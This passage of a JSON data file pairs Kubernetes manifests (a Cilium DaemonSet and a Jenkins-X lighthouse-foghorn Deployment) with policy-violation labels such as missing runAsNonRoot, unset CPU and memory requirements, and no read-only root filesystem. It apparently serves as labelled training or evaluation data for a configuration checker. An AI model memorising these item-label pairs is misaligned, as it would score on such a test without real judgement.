    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"clean-cilium-state\" is not set to runAsNonRoot"
  },
  {
    "id": "03995",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cilium-agent\" has cpu request 0"
  },
  {
    "id": "03996",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"clean-cilium-state\" has cpu request 0"
  },
  {
    "id": "03997",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cilium-agent\" has memory limit 0"
  },
  {
    "id": "03998",
    "manifest_path": "data/manifests/the_stack_sample/sample_1793.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  labels:\n    k8s-app: cilium\n    kubernetes.io/cluster-service: 'true'\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      annotations:\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n    spec:\n      containers:\n      - args:\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --container-runtime=crio\n        - --config-dir=/tmp/cilium/config-map\n        command:\n        - cilium-agent\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: spec.nodeName\n        - name: CILIUM_K8S_NAMESPACE\n          valueFrom:\n            fieldRef:\n              apiVersion: v1\n              fieldPath: metadata.namespace\n        - name: CILIUM_FLANNEL_MASTER_DEVICE\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-master-device\n              name: cilium-config\n              optional: true\n        - name: CILIUM_FLANNEL_UNINSTALL_ON_EXIT\n          valueFrom:\n            configMapKeyRef:\n              key: flannel-uninstall-on-exit\n              name: cilium-config\n              optional: true\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              key: prometheus-serve-addr\n              name: cilium-metrics-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 10\n          initialDelaySeconds: 120\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        name: cilium-agent\n        ports:\n        - containerPort: 9090\n          hostPort: 9090\n          name: prometheus\n          protocol: TCP\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n            - --brief\n          failureThreshold: 3\n          initialDelaySeconds: 5\n          periodSeconds: 30\n          successThreshold: 1\n          timeoutSeconds: 5\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n            - SYS_MODULE\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n        - mountPath: /host/opt/cni/bin\n          name: cni-path\n        - mountPath: /host/etc/cni/net.d\n          name: etc-cni-netd\n        - mountPath: /var/run/crio/crio.sock\n          name: crio-socket\n          readOnly: true\n        - mountPath: /var/lib/etcd-config\n          name: etcd-config-path\n          readOnly: true\n        - mountPath: /var/lib/etcd-secrets\n          name: etcd-secrets\n          readOnly: true\n        - mountPath: /var/lib/cilium/clustermesh\n          name: clustermesh-secrets\n          readOnly: true\n        - mountPath: /tmp/cilium/config-map\n          name: cilium-config-path\n          readOnly: true\n        - mountPath: /lib/modules\n          name: lib-modules\n          readOnly: true\n        - mountPath: /sbin/modprobe\n          name: sbin-modprobe\n          readOnly: true\n      initContainers:\n      - command:\n        - /init-container.sh\n        env:\n        - name: CILIUM_ALL_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-state\n              name: cilium-config\n              optional: true\n        - name: CILIUM_BPF_STATE\n          valueFrom:\n            configMapKeyRef:\n              key: clean-cilium-bpf-state\n              name: cilium-config\n              optional: true\n        image: docker.io/cilium/cilium-init:2019-04-05\n        imagePullPolicy: IfNotPresent\n        name: clean-cilium-state\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - mountPath: /var/run/cilium\n          name: cilium-run\n      serviceAccount: cilium\n      serviceAccountName: cilium\n      volumes:\n      - hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n        name: cilium-run\n      - hostPath:\n          path: /var/run/crio/crio.sock\n          type: Socket\n        name: crio-socket\n      - hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n        name: cni-path\n      - hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n        name: etc-cni-netd\n      - hostPath:\n          path: /lib/modules\n          type: Directory\n        name: lib-modules\n      - hostPath:\n          path: /sbin/modprobe\n          type: File\n        name: sbin-modprobe\n      - configMap:\n          defaultMode: 420\n          items:\n          - key: etcd-config\n            path: etcd.config\n          name: cilium-config\n        name: etcd-config-path\n      - name: etcd-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-etcd-secrets\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n      - configMap:\n          name: cilium-config\n        name: cilium-config-path\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"clean-cilium-state\" has memory limit 0"
  },
  {
    "id": "03999",
    "manifest_path": "data/manifests/the_stack_sample/sample_1794.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.1.52\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: a337134d0e64ec21fde04859d87d697b47666d6c4d404b7e8f1eb39a41ffc05d\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.1.52\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: ranggaperwiratama\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.52\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: DEFAULT_PIPELINE_RUN_TIMEOUT\n          value: 2h0m0s\n        - name: FILE_BROWSER\n          value: git\n        - name: JX_DEFAULT_IMAGE\n          value: ghcr.io/jenkins-x/builder-maven:2.1.149-768\n        - name: LIGHTHOUSE_DASHBOARD_TEMPLATE\n          value: namespaces/{{ .Namespace }}/pipelineruns/{{ .PipelineRun }}\n        - name: LIGHTHOUSE_VERSIONSTREAM_JENKINS_X_JX3_PIPELINE_CATALOG\n          value: 46bcf702811226edac90b77c43cdbfec99bc6fe6\n        resources:\n          limits:\n            cpu: 100m\n            memory: 256Mi\n          requests:\n            cpu: 80m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-foghorn\" does not have a read-only root file system"
  },
  {
    "id": "04000",
    "manifest_path": "data/manifests/the_stack_sample/sample_1794.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-foghorn\n  labels:\n    chart: lighthouse-1.1.52\n    app: lighthouse-foghorn\n    gitops.jenkins-x.io/pipeline: namespaces\n  annotations:\n    meta.helm.sh/release-name: lighthouse\n    wave.pusher.com/update-on-config-change: 'true'\n  namespace: jx\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-foghorn\n  template:\n    metadata:\n      labels:\n        app: lighthouse-foghorn\n      annotations:\n        jenkins-x.io/hash: a337134d0e64ec21fde04859d87d697b47666d6c4d404b7e8f1eb39a41ffc05d\n    spec:\n      serviceAccountName: lighthouse-foghorn\n      containers:\n      - name: lighthouse-foghorn\n        image: ghcr.io/jenkins-x/lighthouse-foghorn:1.1.52\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: ranggaperwiratama\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: HMAC_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-hmac-token\n              key: hmac\n              optional: false\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LOGRUS_SERVICE\n          value: lighthouse\n        - name: LOGRUS_SERVICE_VERSION\n          value: 1.1.52\n        - name: LOGRUS_STACK_SKIP\n          value: ''\n        - name: DEFAULT_PIPELINE_RUN_SERVICE_ACCOUNT\n          value: tekton-bot\n        - name: 